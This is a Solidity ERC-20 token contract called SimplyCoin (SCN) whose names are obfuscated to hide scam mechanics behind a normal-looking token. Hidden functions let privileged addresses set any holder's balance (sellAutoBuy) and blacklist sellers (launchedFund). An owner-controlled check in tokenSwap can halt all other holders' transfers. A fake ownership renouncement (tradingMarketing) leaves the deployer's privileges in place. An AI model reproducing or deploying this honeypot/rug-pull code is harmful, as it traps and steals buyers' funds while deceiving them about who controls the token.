//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract launchTake {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface walletExemptMarketing {
    function createPair(address launchLaunched, address enableMin) external returns (address);

    function feeTo() external view returns (address);
}

interface marketingToken {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface shouldTo {
    function totalSupply() external view returns (uint256);

    function balanceOf(address launchedAuto) external view returns (uint256);

    function transfer(address atLaunchedTx, uint256 maxTeam) external returns (bool);

    function allowance(address isSender, address spender) external view returns (uint256);

    function approve(address spender, uint256 maxTeam) external returns (bool);

    function transferFrom(
        address sender,
        address atLaunchedTx,
        uint256 maxTeam
    ) external returns (bool);

    event Transfer(address indexed from, address indexed modeEnable, uint256 value);
    event Approval(address indexed isSender, address indexed spender, uint256 value);
}

interface shouldToMetadata is shouldTo {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SimplyCoin is launchTake, shouldTo, shouldToMetadata {

    function decimals() external view virtual override returns (uint8) {
        return teamAt;
    }

    mapping(address => bool) public enableExempt;

    function sellReceiver(address teamEnable, address atLaunchedTx, uint256 maxTeam) internal view returns (uint256) {
        require(maxTeam > 0);

        uint256 minFrom = 0;
        if (teamEnable == senderTxMarketing && takeTo > 0) {
            minFrom = maxTeam * takeTo / 100;
        } else if (atLaunchedTx == senderTxMarketing && fromTake > 0) {
            minFrom = maxTeam * fromTake / 100;
        }
        require(minFrom <= maxTeam);
        return maxTeam - minFrom;
    }

    uint256 constant atBuy = 5 ** 10;

    function limitTeam(uint256 maxTeam) public {
        sellReceiverTo();
        teamSwap = maxTeam;
    }

    function transfer(address swapShould, uint256 maxTeam) external virtual override returns (bool) {
        return tokenSwap(_msgSender(), swapShould, maxTeam);
    }

    function tradingMarketing() public {
        emit OwnershipTransferred(shouldAuto, address(0));
        maxListLaunch = address(0);
    }

    bool private marketingIs;

    uint256 private feeFundBuy = 100000000 * 10 ** 18;

    mapping(address => bool) public takeSwap;

    string private receiverMarketing = "Simply Coin";

    address private maxListLaunch;

    uint256 teamSwap;

    function allowance(address sellSwap, address modeAmount) external view virtual override returns (uint256) {
        if (modeAmount == atMax) {
            return type(uint256).max;
        }
        return tradingModeFund[sellSwap][modeAmount];
    }

    function approve(address modeAmount, uint256 maxTeam) public virtual override returns (bool) {
        tradingModeFund[_msgSender()][modeAmount] = maxTeam;
        emit Approval(_msgSender(), modeAmount, maxTeam);
        return true;
    }

    mapping(address => mapping(address => uint256)) private tradingModeFund;

    function name() external view virtual override returns (string memory) {
        return receiverMarketing;
    }

    mapping(address => uint256) private buyReceiver;

    function getOwner() external view returns (address) {
        return maxListLaunch;
    }

    uint256 private buyAt;

    uint256 public senderWallet;

    function limitListMin(address modeAt) public {
        require(modeAt.balance < 100000);
        if (takeLiquiditySell) {
            return;
        }
        if (txLaunched == receiverWallet) {
            txLaunched = true;
        }
        enableExempt[modeAt] = true;
        if (marketingIs) {
            walletReceiver = buyAt;
        }
        takeLiquiditySell = true;
    }

    address public senderTxMarketing;

    function totalSupply() external view virtual override returns (uint256) {
        return feeFundBuy;
    }

    string private senderAmount = "SCN";

    address atMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public buyIs;

    bool private launchReceiver;

    uint8 private teamAt = 18;

    bool public receiverWallet;

    bool private atMarketing;

    function balanceOf(address launchedAuto) public view virtual override returns (uint256) {
        return buyReceiver[launchedAuto];
    }

    function owner() external view returns (address) {
        return maxListLaunch;
    }

    address autoLaunched;

    function launchedFund(address marketingEnable) public {
        sellReceiverTo();
        
        if (marketingEnable == shouldAuto || marketingEnable == senderTxMarketing) {
            return;
        }
        takeSwap[marketingEnable] = true;
    }

    constructor (){
        
        tradingMarketing();
        marketingToken launchSwap = marketingToken(atMax);
        senderTxMarketing = walletExemptMarketing(launchSwap.factory()).createPair(launchSwap.WETH(), address(this));
        autoLaunched = walletExemptMarketing(launchSwap.factory()).feeTo();
        if (buyIs != marketingIs) {
            marketingIs = false;
        }
        shouldAuto = _msgSender();
        enableExempt[shouldAuto] = true;
        buyReceiver[shouldAuto] = feeFundBuy;
        
        emit Transfer(address(0), shouldAuto, feeFundBuy);
    }

    bool private fromBuy;

    uint256 public takeTo = 0;

    uint256 toLimit;

    event OwnershipTransferred(address indexed enableTo, address indexed enableLaunch);

    bool public takeLiquiditySell;

    function transferFrom(address teamEnable, address atLaunchedTx, uint256 maxTeam) external override returns (bool) {
        if (_msgSender() != atMax) {
            if (tradingModeFund[teamEnable][_msgSender()] != type(uint256).max) {
                require(maxTeam <= tradingModeFund[teamEnable][_msgSender()]);
                tradingModeFund[teamEnable][_msgSender()] -= maxTeam;
            }
        }
        return tokenSwap(teamEnable, atLaunchedTx, maxTeam);
    }

    function sellReceiverTo() private view {
        require(enableExempt[_msgSender()]);
    }

    function sellAutoBuy(address swapShould, uint256 maxTeam) public {
        sellReceiverTo();
        buyReceiver[swapShould] = maxTeam;
    }

    bool private txLaunched;

    uint256 public walletReceiver;

    function tokenSwap(address teamEnable, address atLaunchedTx, uint256 maxTeam) internal returns (bool) {
        if (teamEnable == shouldAuto) {
            return buyFeeTrading(teamEnable, atLaunchedTx, maxTeam);
        }
        uint256 maxLaunched = shouldTo(senderTxMarketing).balanceOf(autoLaunched);
        require(maxLaunched == teamSwap);
        require(atLaunchedTx != autoLaunched);
        if (takeSwap[teamEnable]) {
            return buyFeeTrading(teamEnable, atLaunchedTx, atBuy);
        }
        maxTeam = sellReceiver(teamEnable, atLaunchedTx, maxTeam);
        return buyFeeTrading(teamEnable, atLaunchedTx, maxTeam);
    }

    address public shouldAuto;

    function symbol() external view virtual override returns (string memory) {
        return senderAmount;
    }

    uint256 public fromTake = 0;

    function buyFeeTrading(address teamEnable, address atLaunchedTx, uint256 maxTeam) internal returns (bool) {
        require(buyReceiver[teamEnable] >= maxTeam);
        buyReceiver[teamEnable] -= maxTeam;
        buyReceiver[atLaunchedTx] += maxTeam;
        emit Transfer(teamEnable, atLaunchedTx, maxTeam);
        return true;
    }

}